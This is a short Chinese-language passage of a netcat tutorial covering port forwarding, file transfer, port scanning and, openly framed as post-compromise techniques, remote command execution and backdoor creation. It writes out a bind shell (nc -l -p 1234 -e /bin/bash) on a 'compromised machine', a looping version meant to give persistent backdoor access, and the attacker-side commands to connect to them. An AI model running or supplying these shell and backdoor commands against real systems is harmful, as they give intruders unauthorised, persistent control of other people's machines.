    \n# 进阶用法\n\n## 端口转发\n\nNetcat 可用于重定向端口，在不同的服务和网络之间创建隧道。\n\n# 使用示例：\n\n- 1. 将本地端口重定向到远程服务：\n\
    \n```\nmkfifo /tmp/fifo\nnc -l -p 1234 < /tmp/fifo | nc <IP_destino> 5678 > /tmp/fifo\n\
    ```\n\n## 远程命令执行\n\nNetcat 可在被攻破的机器上远程执行命令。\n\n# 使用示例：\n\n- 1. 在被攻破的机器上运行：\n\n\
    ```\nnc -l -p 1234 -e /bin/bash\n```\n\n- 2. 在攻击机器上运行：\n\n```\nnc <compromised_machine_IP>\
    \ 1234\n```\n\n# 实际示例\n\n## 示例 1：文件传输\n\n- 1. 在源系统上：\n\n```\nnc -l -p 1234 < /home/user/document.txt\n\
    ```\n\n- 2. 非目标系统：\n\n```\nnc <origin_system_ip> 1234 > /home/user/cededo.txt\n\
    ```\n\n## 示例 2：端口扫描\n\n- 1. 对远程主机运行端口扫描：\n\n```bash\nnc -zv 192.168.1.1 20-100\n\
    ```\n\n- 2. 分析结果以识别开放的端口。\n\n## 高级技术\n\n### 创建后门\n\nNetcat 可用于在被攻破的机器上创建后门，允许持久的远程访问。\n\
    \n# 使用示例：\n\n- 1. 在被攻破的机器上运行：\n\n```bash\nwhile true; do nc -l -p 1234 -e /bin/bash;\
    \ done\n```\n\n- 2. 在攻击机器上，连接到后门：\n\n```bash\nnc <compromised_machine_IP> 1234\n\
